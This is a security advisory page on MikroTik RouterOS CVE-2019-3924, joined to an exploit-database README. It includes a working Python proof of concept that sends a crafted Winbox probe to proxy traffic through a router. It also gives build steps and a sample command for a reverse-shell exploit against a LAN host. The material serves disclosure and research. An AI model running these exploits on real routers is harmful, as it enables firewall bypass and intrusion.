# MikroTik RouterOS Unauthenticated Intermediary

Medium

[← View More Research Advisories](/security/research)
### Synopsis

MikroTik's [The Dude](https://mikrotik.com/thedude) has a network discovery feature that sends user defined [probes](https://wiki.mikrotik.com/wiki/Manual%3AThe_Dude_v6/Probes) to discover network services. There are various pre-defined probes for HTTP, FTP, Telnet, etc.

![](/sites/drupal.dmz.tenablesecurity.com/files/files/advisory/the_dude.png)

This network scanning feature also supports "recursive scanning" in which probes can be proxied through MikroTik's Winbox port (8291). Tenable discovered that authentication was not enforced on these proxied probe requests. Therefore, an unauthenticated remote attacker could use a MikroTik router to proxy arbitrary traffic. Furthermore, attackers on the WAN can use this feature to send requests to hosts on the LAN.

There are a couple of limitations to MikroTik's probe functionality. A probe only supports up to three requests and responses. Also, the response is not relayed back to the requesting client. The response is instead matched against a regular expression defined in the probe format.

![](/sites/drupal.dmz.tenablesecurity.com/files/files/advisory/probe.png)

The following proof of concept sends an HTTP GET request to a public IP address and matches the response against "^HTTP/1.1 200 ok\r\nServer: micro\_httpd."

```

import argparse
import socket

if __name__ == '__main__':

    cmd_parser = argparse.ArgumentParser(description="PoC")
    cmd_parser.add_argument("-i", "--ip", action="store", dest="ip", required=True, help="Router IP")
    cmd_parser.add_argument("-p", "--port", action="store", dest="port", type=int, help="Winbox Port", default="8291")
    cmd_parser.add_argument("-n", "--name", action="store", dest="name", help="The new hostname")
    args = cmd_parser.parse_args()

    # Connect to Mikrotik router
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print "[+] Attempting connection to " + args.ip + ":" + str(args.port)
    sock.connect((args.ip, args.port))
    print "[+] Connected!"

    request = ('\x9e\x01\x00\x9c\x4d\x32\x05\x00\xff\x01\x03\x00\x00\x08\x42\xfc\x7b\x5a\x04'
               '\x00\x00\x09\x50\x06\x00\xff\x09\x01\x07\x00\xff\x09\x01\x07\x00\x00\x21\x46'
               'GET / HTTP/1.1\r\nHost: 66.252.123.90\r\nUser-Agent: Oops\r\nAccept: */*\r\n'
               '\r\n\x08\x00\x00\x21\x25^HTTP/1.1 200 Ok\r\nServer: micro_httpd\x01\x00\xff'
               '\x88\x01\x00\x68\x00\x00\x00')

sock.sendall(request)
resp = sock.recv(1024)
print '<- ' + resp
sock.close()

```

#### Description

MikroTik RouterOS before 6.43.12 (stable) and 6.42.12 (long-term) is vulnerable to an intermediary vulnerability. The software will execute user defined network requests to both WAN and LAN clients. A remote unauthenticated attacker can use this vulnerability to bypass the router's firewall or for general network scanning activities.

# CVE-2019-3924

A remote, unauthenticated attacker can proxy traffic through RouterOS via probes sent to the agent binary. This PoC demonstrates how to exploit a LAN host from the WAN. A video demonstrating the attack can be found here:

* https://www.youtube.com/watch?v=CxyOtsNVgFg

A Tenable Research Advisory for the vulnerability can be found here:

* https://www.tenable.com/security/research/tra-2019-07

## Compilation
This code was tested on Ubuntu 18.04. There is a dependency on boost, gtest, and cmake. Simply install them like so:

```sh
sudo apt install libboost-dev cmake
```

To compile simply do the following:

```sh
cd routeros/poc/cve_2019_3924/
mkdir build
cd build
cmake ..
```

## Sample Usage

```sh
albinolobster@ubuntu:~/routeros/poc/cve_2019_3924/build$ ./nvr_rev_shell --proxy_ip 192.168.1.70 --proxy_port 8291 --target_ip 10.0.0.252 --target_port 80 --listening_ip 192.168.1.7 --listening_port 1270

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
